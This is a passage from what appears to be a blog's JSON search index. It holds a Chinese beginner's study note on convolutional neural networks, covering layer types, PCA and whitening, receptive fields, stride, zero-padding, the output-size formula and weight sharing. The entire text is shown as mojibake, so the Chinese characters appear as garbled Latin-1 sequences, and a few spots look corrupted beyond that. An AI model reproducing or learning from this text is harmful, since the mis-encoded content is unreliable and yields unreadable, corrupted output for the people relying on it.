æˆåŠŸè§£å†³ã€‚","link":"/2020/04/16/obfs4%E7%BD%91%E6%A1%A5%E9%97%AE%E9%A2%98%E7%9A%84%E5%A4%84%E7%90%86/"},{"title":"å·ç§¯ç¥ç»ç½‘ç»œCNNå…¥é—¨","text":"æœ¬æ–‡ä¸»è¦æ˜¯è®°å½•ä¸€ä¸‹å¯¹å·ç§¯ç¥ç»ç½‘ç»œï¼ˆCNNï¼‰çš„å­¦ä¹ ï¼Œè¿™æ˜¯åœ¨æœºå™¨å­¦ä¹ ï¼Œå…·ä½“æ¥è¯´æ˜¯æ·±åº¦å­¦ä¹ ä¸­çš„ç¬¬ä¸€æ­¥ï¼Œè®¤çœŸå­¦ä¹ ã€å¥½å¥½è®°å½•ã€‚ CNNæ›¾ç»è¢«AlphaGoçš„å¼€å‘å›¢é˜Ÿç”¨äºå…¶å¼€å‘ï¼Œä»è€Œä¹Ÿä¸€åº¦å¼•èµ·ä¸šå†…äººå£«çš„é’çï¼Œä¸è¿‡æœ‰äº›æ—¶å€™ä¼šå‡ºç°å¯¹CNNçš„ç›²ç›®å´‡æ‹œï¼Œæ¯”å¦‚ä½ é¢è¯•çš„æ—¶å€™ï¼Œå¯¹é¢å¯èƒ½ä¼šé—®ï¼šä½ åšè¿‡æœºå™¨å­¦ä¹ å—ï¼Ÿä½ ä¸ºä»€ä¹ˆæ²¡æœ‰é‡‡ç”¨CNNç®—æ³•å‘¢ï¼Ÿè¿™å¯èƒ½è®©äººæ— æ³•å›ç­”ï¼Œå…¶å®CNNè™½ç„¶ç›¸å¯¹äºæ·±åº¦ç¥ç»ç½‘ç»œï¼ˆDNNï¼‰æ›´åŠ ç®€ä¾¿ï¼Œæ•ˆèƒ½ä¹Ÿå¾ˆå¥½ï¼Œä¸è¿‡CNNåªæ˜¯ç”¨äºå›¾åƒå¤„ç†ï¼Œæˆ–è€…å…·æœ‰ä¸å›¾åƒå¤„ç†è¦ç´ ç›¸å½“çš„ä¸€äº›é—®é¢˜çš„å¤„ç†ä¸­ï¼Œå°±æ¯”å¦‚AlphaGoçš„ä¸‹å›´æ£‹ï¼Œå…¶å®å°±ç›¸å½“äºæŠŠæ£‹ç›˜å½“åšäº†å›¾åƒæ¥è¿›è¡Œå¤„ç†ï¼Œå› æ­¤ï¼Œå¦‚æœä½ éœ€è¦åˆ©ç”¨ç¥ç»ç½‘ç»œå®ç°æŸäº›é¡¹ç›®ï¼Œä¸€å®šè¦è€ƒè™‘å¥½å®ƒå…·å¤‡ä¸å›¾åƒå¤„ç†ç›¸å½“çš„è¦ç´ æ²¡æœ‰ã€‚ è¿™é‡Œæä¾›ä¸€ä¸ªæ¯”è¾ƒå¥½çš„å­¦ä¹ è§†é¢‘ï¼Œæ˜¯æå®æ¯…è€å¸ˆçš„æ•™å­¦è§†é¢‘ã€‚å¥½äº†ï¼Œä¸‹é¢è¿›å…¥å­¦ä¹ è®°å½•äº†ã€‚ å·ç§¯ç¥ç»ç½‘ç»œæ¦‚è¿°å·ç§¯ç¥ç»ç½‘ç»œï¼Œæ˜¯æ·±åº¦å­¦ä¹ ç®—æ³•åº”ç”¨æœ€æˆåŠŸçš„é¢†åŸŸä¹‹ä¸€ï¼Œå·ç§¯ç¥ç»ç½‘ç»œåŒ…æ‹¬ä¸€ç»´å·ç§¯ç¥ç»ç½‘ç»œï¼ŒäºŒç»´å·ç§¯ç¥ç»ç½‘ç»œä»¥åŠä¸‰ç»´å·ç§¯ç¥ç»ç½‘ç»œã€‚ä¸€ç»´å·ç§¯ç¥ç»ç½‘ç»œä¸»è¦ç”¨äºåºåˆ—ç±»çš„æ•°æ®å¤„ç†ï¼ŒäºŒç»´å·ç§¯ç¥ç»ç½‘ç»œå¸¸åº”ç”¨äºå›¾åƒç±»æ–‡æœ¬çš„è¯†åˆ«ï¼Œä¸‰ç»´å·ç§¯ç¥ç»ç½‘ç»œä¸»è¦åº”ç”¨äºåŒ»å­¦å›¾åƒä»¥åŠè§†é¢‘ç±»æ•°æ®è¯†åˆ«ã€‚ å…¶ç»“æ„æ¨¡å‹å¦‚ä¸‹ï¼š ä¸å¸¸è§„ç¥ç»ç½‘ç»œä¸åŒï¼Œå·ç§¯ç¥ç»ç½‘ç»œçš„å„å±‚ä¸­çš„ç¥ç»å…ƒæ˜¯3ç»´æ’åˆ—çš„ï¼šå®½åº¦ã€é«˜åº¦å’Œæ·±åº¦ã€‚å…¶ä¸­çš„å®½åº¦å’Œé«˜åº¦æ˜¯å¾ˆå¥½ç†è§£çš„ï¼Œå› ä¸ºæœ¬èº«å·ç§¯å°±æ˜¯ä¸€ä¸ªäºŒç»´æ¨¡æ¿ï¼Œä½†æ˜¯åœ¨å·ç§¯ç¥ç»ç½‘ç»œä¸­çš„æ·±åº¦æŒ‡çš„æ˜¯æ¿€æ´»æ•°æ®ä½“çš„ç¬¬ä¸‰ä¸ªç»´åº¦ï¼Œè€Œä¸æ˜¯æ•´ä¸ªç½‘ç»œçš„æ·±åº¦ï¼Œæ•´ä¸ªç½‘ç»œçš„æ·±åº¦æŒ‡çš„æ˜¯ç½‘ç»œçš„å±‚æ•°ã€‚ å·ç§¯ç¥ç»ç½‘ç»œå±‚æ¬¡å·ç§¯ç¥ç»ç½‘ç»œä¸»è¦ç”±è¿™å‡ ç±»å±‚æ„æˆï¼šè¾“å…¥å±‚ã€å·ç§¯å±‚ï¼ŒReLUå±‚ã€æ± åŒ–ï¼ˆPoolingï¼‰å±‚(æœ‰æ—¶ä¹Ÿç§°é™é‡‡æ ·ã€ä¸‹é‡‡æ ·å±‚)å’Œå…¨è¿æ¥å±‚ï¼ˆå…¨è¿æ¥å±‚å’Œå¸¸è§„ç¥ç»ç½‘ç»œä¸­çš„ä¸€æ ·ï¼‰ã€‚é€šè¿‡å°†è¿™äº›å±‚å åŠ èµ·æ¥ï¼Œå°±å¯ä»¥æ„å»ºä¸€ä¸ªå®Œæ•´çš„å·ç§¯ç¥ç»ç½‘ç»œï¼Œå¦‚ä¸‹å›¾ï¼š å„å±‚çš„ä¸»è¦ä½œç”¨å¦‚ä¸‹ï¼š è¾“å…¥å±‚ï¼šç”¨äºæ•°æ®çš„è¾“å…¥ï¼› å·ç§¯å±‚ï¼šä½¿ç”¨å·ç§¯æ ¸è¿›è¡Œç‰¹å¾æå–å’Œç‰¹å¾æ˜ å°„ï¼› æ± åŒ–å±‚ï¼šè¿›è¡Œä¸‹é‡‡æ ·ï¼Œå¯¹ç‰¹å¾å›¾ç¨€ç–å¤„ç†ï¼Œå‡å°‘æ•°æ®è¿ç®—é‡ï¼› æ¿€åŠ±å±‚ï¼šç”±äºå·ç§¯ä¹Ÿæ˜¯ä¸€ç§çº¿æ€§è¿ç®—ï¼Œå› æ­¤éœ€è¦å¢åŠ éçº¿æ€§æ˜ å°„ï¼› å…¨è¿æ¥å±‚ï¼šé€šå¸¸åœ¨CNNçš„å°¾éƒ¨è¿›è¡Œé‡æ–°æ‹Ÿåˆï¼Œå‡å°‘ç‰¹å¾ä¿¡æ¯çš„æŸå¤±ã€‚ è¾“å…¥å±‚è¯¥å±‚é™¤äº†è¾“å…¥æ•°æ®ï¼Œè¿˜ä¼šå¯¹æ•°æ®è¿›è¡Œä¸€äº›é¢„å¤„ç†ï¼ŒåŒ…æ‹¬ï¼šå»å‡å€¼ã€å½’ä¸€åŒ–ã€PCAã€ç™½åŒ– PCAï¼šæ˜¯æŒ‡é€šè¿‡æŠ›å¼ƒæºå¸¦ä¿¡æ¯é‡è¾ƒå°‘çš„ç»´åº¦ï¼Œä¿ç•™ä¸»è¦çš„ç‰¹å¾ä¿¡Jè‡ªï¼Œæ¥å¯¹æ•°æ®è¿›è¡Œé™ç»´å¤„ç†ï¼Œæ€è·¯ä¸Šæ˜¯ä½¿ç”¨å°‘æ•°å‡ ä¸ªæœ‰ä»£è¡¨æ€§ã€äº’ä¸ç›¸å…³çš„ç‰¹å¾æ¥ä»£æ›¿åŸå…ˆçš„..ké‡çš„ã€å­˜åœ¨ä¸€å®šç›¸å…³æ€§çš„ç‰¹å¾ï¼Œä»è€ŒåŠ é€Ÿæœºå™¨å­¦ä¹ è¿›ç¨‹ã€‚PCAå¯ç”¨äºç‰¹å¾æå–ï¼Œæ•°æ®å‹ç¼©ï¼Œå»å™ªå£°ï¼Œé™ç»´ç­‰æ“ä½œã€‚ ç™½åŒ–ï¼šç›®çš„æ˜¯å»æ‰æ•°æ®ä¹‹é—´çš„ç›¸å…³è”åº¦å’Œä»¤æ–¹å·®å‡ä¸€åŒ–ï¼Œç”±äºå›¾åƒä¸­ç›¸é‚»åƒç´ ä¹‹é—´å…·æœ‰å¾ˆå¼ºçš„ç›¸å…³æ€§ï¼Œæ‰€ä»¥ç”¨äºè®­ç»ƒæ—¶å¾ˆå¤šè¾“å…¥æ˜¯å†—ä½™çš„ã€‚è¿™æ—¶å€™å»ç›¸å…³çš„æ“ä½œå°±å¯ä»¥é‡‡ç”¨è‡ªåŒ–æ“ä½œï¼Œä»è€Œä½¿å¾—ï¼š 1ã€å‡å°‘ç‰¹å¾ä¹‹é—´çš„ç›¸å…³æ€§ 2ã€ç‰¹å¾å…·æœ‰ç›¸åŒçš„æ–¹å·® å·ç§¯å±‚å·ç§¯å±‚æ˜¯æ„å»ºå·ç§¯ç¥ç»ç½‘ç»œçš„æ ¸å¿ƒå±‚ï¼Œå› æ­¤è¯¥å±‚ä¹Ÿæ˜¯å­¦ä¹ çš„é‡ç‚¹ã€‚å®ƒäº§ç”Ÿäº†ç½‘ç»œä¸­å¤§éƒ¨åˆ†çš„è®¡ç®—é‡ï¼Œæ³¨æ„æ˜¯è®¡ç®—é‡è€Œä¸æ˜¯å‚æ•°é‡ã€‚ å·ç§¯å±‚çš„ä½œç”¨ ä¸»è¦æœ‰ä¸‰ç‚¹ï¼š æ»¤æ³¢å™¨çš„ä½œç”¨æˆ–è€…è¯´æ˜¯å·ç§¯çš„ä½œç”¨ å·ç§¯å±‚çš„å‚æ•°æ˜¯æœ‰ä¸€äº›å¯å­¦ä¹ çš„æ»¤æ³¢å™¨ï¼ˆFilterï¼‰é›†åˆæ„æˆçš„ã€‚æ¯ä¸ªæ»¤æ³¢å™¨åœ¨ç©ºé—´ä¸Šï¼ˆå®½åº¦å’Œé«˜åº¦ï¼‰éƒ½æ¯”è¾ƒå°ï¼Œä½†æ˜¯æ·±åº¦å’Œè¾“å…¥æ•°æ®ä¸€è‡´ã€‚ç›´è§‚åœ°æ¥è¯´ï¼Œç½‘ç»œä¼šè®©æ»¤æ³¢å™¨å­¦ä¹ åˆ°å½“å®ƒçœ‹åˆ°æŸäº›ç±»å‹çš„è§†è§‰ç‰¹å¾æ—¶å°±æ¿€æ´»ï¼Œå…·ä½“çš„è§†è§‰ç‰¹å¾å¯èƒ½æ˜¯æŸäº›æ–¹ä½ä¸Šçš„è¾¹ç•Œï¼Œæˆ–è€…åœ¨ç¬¬ä¸€å±‚ä¸ŠæŸäº›é¢œè‰²çš„æ–‘ç‚¹ï¼Œç”šè‡³å¯ä»¥æ˜¯ç½‘ç»œæ›´é«˜å±‚ä¸Šçš„èœ‚å·¢çŠ¶ã€è½¦è½®çŠ¶çš„å›¾æ¡ˆã€‚ å¯ä»¥çœ‹åšç¥ç»å…ƒçš„ä¸€ä¸ªè¾“å‡º ç¥ç»å…ƒåªè§‚å¯Ÿè¾“å…¥æ•°æ®ä¸­çš„ä¸€å°éƒ¨åˆ†ï¼Œå¹¶ä¸”å’Œç©ºé—´ä¸Šå·¦å³ä¸¤è¾¹çš„æ‰€æœ‰ç¥ç»å…ƒå…±äº«å‚æ•°ï¼ˆå› ä¸ºè¿™äº›æ•°å­—éƒ½æ˜¯ä½¿ç”¨åŒä¸€ä¸ªæ»¤æ³¢å™¨å¾—åˆ°çš„ç»“æœï¼‰ã€‚ å‡å°‘å‚æ•°æ•°é‡ è¿™ä¸ªç”±äºå·ç§¯å…·æœ‰â€œæƒå€¼å…±äº«â€è¿™æ ·çš„ç‰¹æ€§ï¼Œå¯ä»¥é™ä½å‚æ•°æ•°é‡ï¼Œè¾¾åˆ°é™ä½è®¡ç®—å¼€é”€ï¼Œé˜²æ­¢ç”±äºå‚æ•°è¿‡å¤šè€Œé€ æˆè¿‡æ‹Ÿåˆã€‚ æ„Ÿå—é‡ åœ¨å¤„ç†å›¾åƒè¿™æ ·çš„é«˜ç»´åº¦è¾“å…¥æ—¶ï¼Œè®©æ¯ä¸ªç¥ç»å…ƒéƒ½ä¸å‰ä¸€å±‚ä¸­çš„æ‰€æœ‰ç¥ç»å…ƒè¿›è¡Œå…¨è¿æ¥æ˜¯ä¸ç°å®çš„ã€‚è€Œæ˜¯è®©æ¯ä¸ªç¥ç»å…ƒåªä¸è¾“å…¥æ•°æ®çš„ä¸€ä¸ªå±€éƒ¨åŒºåŸŸè¿æ¥ï¼Œè¯¥è¿æ¥çš„ç©ºé—´å¤§å°å«åšç¥ç»å…ƒçš„æ„Ÿå—é‡ï¼ˆreceptive fieldï¼‰ï¼Œå®ƒçš„å°ºå¯¸æ˜¯ä¸€ä¸ªè¶…å‚æ•°ï¼ˆæ»¤æ³¢å™¨çš„ç©ºé—´å°ºå¯¸ï¼‰ã€‚æ³¨æ„ï¼šåœ¨æ·±åº¦æ–¹å‘ä¸Šï¼Œè¿™ä¸ªè¿æ¥çš„å¤§å°æ€»æ˜¯å’Œè¾“å…¥çš„æ·±åº¦ç›¸ç­‰ã€‚ ç¥ç»å…ƒçš„ç©ºé—´æ’åˆ— æ„Ÿå—é‡è®²è§£äº†å·ç§¯å±‚ä¸­æ¯ä¸ªç¥ç»å…ƒä¸è¾“å…¥æ•°æ®ä½“ä¹‹é—´çš„è¿æ¥æ–¹å¼ï¼Œä½†æ˜¯å°šæœªè®¨è®ºè¾“å‡ºæ•°æ®ä½“ä¸­ç¥ç»å…ƒçš„æ•°é‡ï¼Œä»¥åŠå®ƒä»¬çš„æ’åˆ—æ–¹å¼ã€‚3ä¸ªè¶…å‚æ•°æ§åˆ¶ç€è¾“å‡ºæ•°æ®ä½“çš„å°ºå¯¸ï¼šæ·±åº¦ï¼ˆdepthï¼‰ï¼Œæ­¥é•¿ï¼ˆstrideï¼‰å’Œé›¶å¡«å……ï¼ˆzero-paddingï¼‰ï¼š æ·±åº¦ï¼šä¸€ä¸ªè¶…å‚æ•°ï¼Œå’Œä½¿ç”¨çš„æ»¤æ³¢å™¨çš„æ•°é‡ä¸€è‡´ï¼Œè€Œæ¯ä¸ªæ»¤æ³¢å™¨åœ¨è¾“å…¥æ•°æ®ä¸­å¯»æ‰¾ä¸€äº›ä¸åŒçš„ä¸œè¥¿ï¼Œå³å›¾åƒçš„æŸäº›ç‰¹å¾ã€‚ æ­¥é•¿ï¼šåœ¨æ»‘åŠ¨æ»¤æ³¢å™¨çš„æ—¶å€™ï¼Œå¿…é¡»æŒ‡å®šæ­¥é•¿ã€‚å½“æ­¥é•¿ä¸º1ï¼Œæ»¤æ³¢å™¨æ¯æ¬¡ç§»åŠ¨1ä¸ªåƒç´ ï¼›å½“æ­¥é•¿ä¸º2ï¼Œæ»¤æ³¢å™¨æ»‘åŠ¨æ—¶æ¯æ¬¡ç§»åŠ¨2ä¸ªåƒç´ ï¼Œä¾æ¬¡ç±»æ¨ã€‚è¿™ä¸ªæ“ä½œä¼šè®©è¾“å‡ºæ•°æ®ä½“åœ¨ç©ºé—´ä¸Šå˜å°ã€‚ é›¶å¡«å……ï¼šæœ‰æ—¶å€™å°†è¾“å…¥æ•°æ®ä½“ç”¨0åœ¨è¾¹ç¼˜å¤„è¿›è¡Œå¡«å……æ˜¯å¾ˆæ–¹ä¾¿çš„ã€‚é›¶å¡«å……çš„å°ºå¯¸æ˜¯ä¸€ä¸ªè¶…å‚æ•°ã€‚å®ƒå…·æœ‰ä¸€ä¸ªè‰¯å¥½æ€§è´¨ï¼Œå³å¯ä»¥æ§åˆ¶è¾“å‡ºæ•°æ®ä½“çš„ç©ºé—´å°ºå¯¸ï¼ˆæœ€å¸¸ç”¨çš„æ˜¯ç”¨æ¥ä¿æŒè¾“å…¥æ•°æ®ä½“åœ¨ç©ºé—´ä¸Šçš„å°ºå¯¸ï¼Œä½¿å¾—è¾“å…¥å’Œè¾“å‡ºçš„å®½é«˜éƒ½ç›¸ç­‰ï¼‰ã€‚ è¾“å‡ºæ•°æ®ä½“åœ¨ç©ºé—´ä¸Šçš„å°ºå¯¸ W2*H2*D2å¯ä»¥é€šè¿‡è¾“å…¥æ•°æ®ä½“å°ºå¯¸W1*H1*D1ã€å·ç§¯å±‚ä¸­ç¥ç»å…ƒçš„æ„Ÿå—é‡å°ºå¯¸Fã€æ­¥é•¿Sã€æ»¤æ³¢å™¨æ•°é‡Kå’Œé›¶å¡«å……çš„æ•°é‡Pè®¡ç®—è¾“å‡ºå‡ºæ¥ï¼š æ³¨æ„è¿™äº›ç©ºé—´æ’åˆ—çš„è¶…å‚æ•°ä¹‹é—´æ˜¯ç›¸äº’é™åˆ¶çš„ã€‚ä¸¾ä¾‹è¯´æ¥ï¼Œå½“è¾“å…¥å°ºå¯¸W=10ï¼Œä¸ä½¿ç”¨é›¶å¡«å……P=0ï¼Œæ»¤æ³¢å™¨å°ºå¯¸ F=3ï¼Œæ­¤æ—¶æ­¥é•¿S=2æ˜¯è¡Œä¸é€šï¼Œå› ä¸º(W-F+2P)/S+1=(10-3+0)/2+1=4.5ï¼Œç»“æœä¸æ˜¯æ•´æ•°ï¼Œè¿™å°±æ˜¯è¯´ç¥ç»å…ƒä¸èƒ½æ•´é½å¯¹ç§°åœ°æ»‘è¿‡è¾“å…¥æ•°æ®ä½“ã€‚å› æ­¤ï¼Œè¿™äº›è¶…å‚æ•°çš„è®¾å®šå°±è¢«è®¤ä¸ºæ˜¯æ— æ•ˆçš„ï¼Œä¸€ä¸ªå·ç§¯ç¥ç»ç½‘ç»œåº“å¯èƒ½ä¼šæŠ¥å‡ºä¸€ä¸ªé”™è¯¯ï¼Œé€šè¿‡ä¿®æ”¹é›¶å¡«å……å€¼ã€ä¿®æ”¹è¾“å…¥æ•°æ®ä½“å°ºå¯¸ï¼Œæˆ–è€…å…¶ä»–ä»€ä¹ˆæªæ–½æ¥è®©è®¾ç½®åˆç†ã€‚åˆç†åœ°è®¾ç½®ç½‘ç»œçš„å°ºå¯¸è®©æ‰€æœ‰çš„ç»´åº¦éƒ½èƒ½æ­£å¸¸å·¥ä½œï¼Œæ˜¯ç›¸å½“è®©äººå¤´ç—›çš„äº‹ï¼Œè€Œä½¿ç”¨é›¶å¡«å……å’Œéµå®ˆå…¶ä»–ä¸€äº›è®¾è®¡ç­–ç•¥å°†ä¼šæœ‰æ•ˆè§£å†³è¿™ä¸ªé—®é¢˜ã€‚ æƒå€¼å…±äº« åœ¨å·ç§¯å±‚ä¸­æƒå€¼å…±äº«æ˜¯ç”¨æ¥æ§åˆ¶å‚æ•°çš„æ•°é‡ã€‚å‡å¦‚åœ¨ä¸€ä¸ªå·ç§¯æ ¸ä¸­ï¼Œæ¯ä¸€ä¸ªæ„Ÿå—é‡é‡‡ç”¨çš„éƒ½æ˜¯ä¸åŒçš„æƒé‡å€¼ï¼ˆå·ç§¯æ ¸çš„å€¼ä¸åŒï¼‰ï¼Œé‚£ä¹ˆè¿™æ ·çš„ç½‘ç»œä¸­å‚æ•°æ•°é‡å°†æ˜¯ååˆ†å·¨å¤§çš„ã€‚ æƒå€¼å…±äº«æ˜¯åŸºäºè¿™æ ·çš„ä¸€ä¸ªåˆç†çš„å‡è®¾ï¼šå¦‚æœä¸€ä¸ªç‰¹å¾åœ¨è®¡ç®—æŸä¸ªç©ºé—´ä½ç½®(x1,y1)(x1,y1)çš„æ—¶å€™æœ‰ç”¨ï¼Œé‚£ä¹ˆå®ƒåœ¨è®¡ç®—å¦ä¸€ä¸ªä¸åŒä½ç½®(x2,y2)(x2,y2)çš„æ—¶å€™ä¹Ÿæœ‰ç”¨ã€‚åŸºäºè¿™ä¸ªå‡è®¾ï¼Œå¯ä»¥æ˜¾è‘—åœ°å‡å°‘å‚æ•°æ•°é‡ã€‚æ¢è¨€ä¹‹ï¼Œå°±æ˜¯å°†æ·±åº¦ç»´åº¦ä¸Šä¸€ä¸ªå•ç‹¬çš„2ç»´åˆ‡ç‰‡çœ‹åšæ·±åº¦åˆ‡ç‰‡ï¼ˆdepth sliceï¼‰ï¼Œæ¯”å¦‚ä¸€ä¸ªæ•°æ®ä½“å°ºå¯¸ä¸º[55x55x96]çš„å°±æœ‰96ä¸ªæ·±åº¦åˆ‡ç‰‡ï¼Œæ¯ä¸ªå°ºå¯¸ä¸º[55x55]ï¼Œå…¶ä¸­åœ¨æ¯ä¸ªæ·±åº¦åˆ‡ç‰‡ä¸Šçš„ç»“æœéƒ½ä½¿ç”¨åŒæ ·çš„æƒé‡å’Œåå·®è·å¾—çš„ã€‚åœ¨è¿™æ ·çš„å‚æ•°å…±äº«ä¸‹ï¼Œå‡å¦‚ä¸€ä¸ªä¾‹å­ä¸­çš„ç¬¬ä¸€ä¸ªå·ç§¯å±‚æœ‰96ä¸ªå·ç§¯æ ¸ï¼Œé‚£ä¹ˆå°±æœ‰96ä¸ªä¸åŒçš„æƒé‡é›†äº†ï¼Œä¸€ä¸ªæƒé‡é›†å¯¹åº”ä¸€ä¸ªæ·±åº¦åˆ‡ç‰‡ï¼Œå¦‚æœå·ç§¯æ ¸çš„å¤§å°æ˜¯11x11çš„ï¼Œå›¾åƒæ˜¯RGB3é€šé“çš„ï¼Œé‚£ä¹ˆå°±å…±æœ‰96x11x11x3=34,848ä¸ªä¸åŒçš„æƒé‡ï¼Œæ€»å…±æœ‰34,944ä¸ªå‚æ•°ï¼ˆå› ä¸ºè¦+96ä¸ªåå·®ï¼‰ï¼Œå¹¶ä¸”åœ¨æ¯ä¸ªæ·±åº¦åˆ‡ç‰‡ä¸­çš„55x55çš„ç»“æœä½¿ç”¨çš„éƒ½æ˜¯åŒæ ·çš„å‚æ•°ã€‚ åœ¨åå‘ä¼ æ’­çš„æ—¶å€™ï¼Œéƒ½è¦è®¡ç®—æ¯ä¸ªç¥ç»å…ƒå¯¹å®ƒçš„æƒé‡çš„æ¢¯åº¦ï¼Œä½†æ˜¯éœ€è¦æŠŠåŒä¸€ä¸ªæ·±åº¦åˆ‡ç‰‡ä¸Šçš„æ‰€æœ‰ç¥ç»å…ƒå¯¹æƒé‡çš„æ¢¯åº¦ç´¯åŠ ï¼Œè¿™æ ·å°±å¾—åˆ°äº†å¯¹å…±äº«æƒé‡çš„æ¢¯åº¦ã€‚è¿™æ ·ï¼Œæ¯ä¸ªåˆ‡ç‰‡åªæ›´æ–°ä¸€ä¸ªæƒé‡é›†ã€‚åŸç†å¦‚ä¸‹å›¾ï¼š å¦‚ä¸Šä¸¤å›¾æ‰€ç¤ºï¼Œå·¦ä¾§çš„ç¥ç»å…ƒæ˜¯å°†æ¯ä¸€ä¸ªæ„Ÿå—é‡å±•å¼€ä¸ºä¸€åˆ—ä¹‹åä¸²è”èµ·æ¥ï¼ˆå°±æ˜¯å±•å¼€æ’æˆä¸€åˆ—ï¼ŒåŒä¸€å±‚ç¥ç»å…ƒä¹‹é—´ä¸è¿æ¥ï¼‰ã€‚å³ä¾§çš„Deep1iæ˜¯æ·±åº¦ä¸º1çš„ç¥ç»å…ƒçš„ç¬¬iä¸ªï¼ŒDeep2iæ˜¯æ·±åº¦ä¸º2çš„ç¥ç»å…ƒçš„ç¬¬iä¸ªï¼ŒåŒä¸€ä¸ªæ·±åº¦çš„ç¥ç»å…ƒçš„æƒå€¼éƒ½æ˜¯ç›¸åŒçš„ï¼Œé»„è‰²çš„éƒ½æ˜¯ç›¸åŒçš„ï¼ˆä¸Šé¢4ä¸ªä¸ä¸‹é¢4ä¸ªçš„å‚æ•°ç›¸åŒï¼‰ï¼Œè“è‰²ä¹Ÿéƒ½æ˜¯ç›¸åŒçš„ã€‚ æ‰€ä»¥ç°åœ¨å›è¿‡å¤´æ¥çœ‹ä¸Šé¢è¯´çš„å·ç§¯ç¥ç»ç½‘ç»œçš„åå‘ä¼ æ’­å…¬å¼å¯¹æ¢¯åº¦è¿›è¡Œç´¯åŠ æ±‚å’Œä¹Ÿæ˜¯åŸºäºè¿™ç‚¹è€ƒè™‘ï¼ˆåŒä¸€æ·±åº¦çš„ä¸åŒç¥ç»å…ƒå…±ç”¨ä¸€ç»„å‚æ•°ï¼Œæ‰€ä»¥ç´¯åŠ ï¼‰ï¼›è€Œæ¯ä¸ªåˆ‡ç‰‡åªæ›´æ–°ä¸€ä¸ªæƒé‡é›†çš„åŸå› ä¹Ÿæ˜¯è¿™æ ·çš„ï¼Œå› ä¸ºä»å›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼Œä¸åŒæ·±åº¦çš„ç¥ç»å…ƒä¸ä¼šå…¬ç”¨ç›¸åŒçš„æƒé‡ï¼Œæ‰€ä»¥åªèƒ½æ›´æ–°ä¸€ä¸ªæƒé‡é›†ã€‚ æ³¨æ„ï¼šå¦‚æœåœ¨ä¸€ä¸ªæ·±åº¦åˆ‡ç‰‡ä¸­çš„æ‰€æœ‰æƒé‡éƒ½ä½¿ç”¨åŒä¸€ä¸ªæƒé‡å‘é‡ï¼Œé‚£ä¹ˆå·ç§¯å±‚çš„å‰å‘ä¼ æ’­åœ¨æ¯ä¸ªæ·±åº¦åˆ‡ç‰‡ä¸­å¯ä»¥çœ‹åšæ˜¯åœ¨è®¡ç®—ç¥ç»å…ƒæƒé‡å’Œè¾“å…¥æ•°æ®ä½“çš„å·ç§¯ï¼ˆè¿™å°±æ˜¯â€œå·ç§¯å±‚â€åå­—ç”±æ¥ï¼‰ã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæ€»æ˜¯å°†è¿™äº›æƒé‡é›†åˆç§°ä¸ºæ»¤æ³¢å™¨ï¼ˆæˆ–å·ç§¯æ ¸ï¼ˆkernelï¼‰ï¼‰ï¼Œå› ä¸ºå®ƒä»¬å’Œè¾“å…¥è¿›è¡Œäº†å·ç§¯ã€‚ æ³¨æ„ï¼šæœ‰æ—¶å€™å‚æ•°å…±äº«å‡è®¾å¯èƒ½æ²¡æœ‰æ„ä¹‰ï¼Œç‰¹åˆ«æ˜¯å½“å·ç§¯ç¥ç»ç½‘ç»œçš„è¾“å…¥å›¾åƒæ˜¯ä¸€äº›æ˜ç¡®çš„ä¸­å¿ƒç»“æ„æ—¶å€™ã€‚è¿™æ—¶å€™æˆ‘ä»¬å°±åº”è¯¥æœŸæœ›åœ¨å›¾ç‰‡çš„ä¸åŒä½ç½®å­¦ä¹ åˆ°å®Œå…¨ä¸åŒçš„ç‰¹å¾ï¼ˆè€Œä¸€ä¸ªå·ç§¯æ ¸æ»‘åŠ¨åœ°ä¸å›¾åƒåšå·ç§¯éƒ½æ˜¯åœ¨å­¦ä¹ ç›¸åŒçš„ç‰¹å¾ï¼‰ã€‚ä¸€ä¸ªå…·ä½“çš„ä¾‹å­å°±æ˜¯è¾“å…¥å›¾åƒæ˜¯äººè„¸ï¼Œäººè„¸ä¸€èˆ¬éƒ½å¤„äºå›¾ç‰‡ä¸­å¿ƒï¼Œè€Œæˆ‘ä»¬æœŸæœ›åœ¨ä¸åŒçš„ä½ç½®å­¦ä¹ åˆ°ä¸åŒçš„ç‰¹å¾ï¼Œæ¯”å¦‚çœ¼ç›ç‰¹å¾æˆ–è€…å¤´å‘ç‰¹å¾å¯èƒ½ï¼ˆä¹Ÿåº”è¯¥ï¼‰ä¼šåœ¨å›¾ç‰‡çš„ä¸åŒä½ç½®è¢«å­¦ä¹ ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œé€šå¸¸å°±æ”¾æ¾å‚æ•°å…±äº«çš„é™åˆ¶ï¼Œå°†å±‚ç§°ä¸ºå±€éƒ¨è¿æ¥å±‚ï¼ˆLocally-Connected Layerï¼‰ã€‚ å·ç§¯å±‚çš„è¶…å‚æ•°åŠé€‰æ‹© ç”±äºå‚æ•°å…±äº«ï¼Œæ¯ä¸ªæ»¤æ³¢å™¨åŒ…å«F*F*D1ä¸ªæƒé‡ï¼Œå·ç§¯å±‚ä¸€å…±æœ‰F*F*D1*Kä¸ªæƒé‡å’ŒKä¸ªåç§»ã€‚åœ¨è¾“å‡ºæ•°æ®ä½“ä¸­ï¼Œç¬¬dä¸ªæ·±åº¦åˆ‡ç‰‡ï¼ˆç©ºé—´å°ºå¯¸æ˜¯W2*H2ï¼‰ï¼Œç”¨ç¬¬dä¸ªæ»¤æ³¢å™¨å’Œè¾“å…¥æ•°æ®è¿›è¡Œæœ‰æ•ˆå·ç§¯è¿ç®—çš„ç»“æœï¼ˆä½¿ç”¨æ­¥é•¿Sï¼‰ï¼Œæœ€ååœ¨åŠ ä¸Šç¬¬dä¸ªåå·®ã€‚ å¯¹è¿™äº›è¶…å‚æ•°ï¼Œå¸¸è§çš„è®¾ç½®æ˜¯F=3ï¼ŒS=1ï¼ŒP=1ï¼ŒF=3ï¼ŒS=1ï¼ŒP=1ã€‚ å·ç§¯å±‚æ¼”ç¤º å› 